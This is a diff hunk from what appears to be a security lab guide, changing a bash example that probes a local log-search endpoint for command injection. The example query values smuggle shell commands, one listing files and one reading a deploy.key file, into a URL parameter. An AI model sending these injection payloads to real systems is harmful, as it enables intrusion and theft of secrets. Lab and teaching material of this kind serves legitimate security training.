@@ -26,7 +26,7 @@ in the template has a partner. Without that last `echo '` the shell reports
 like "not vulnerable".
 
 ```bash
-h5i browser open 'http://127.0.0.1:9160/api/logs/search?q=ERROR' --session lab16 --new --capture
+h5i browser open 'http://127.0.0.1:9160/api/logs/search?q=ERROR' --session lab16 --new
 h5i websec replay req_0 --session lab16 --set "query.q=zz'; ls; echo '"
 h5i websec replay req_0 --session lab16 --set "query.q=zz'; cat deploy.key; echo '"
 ```
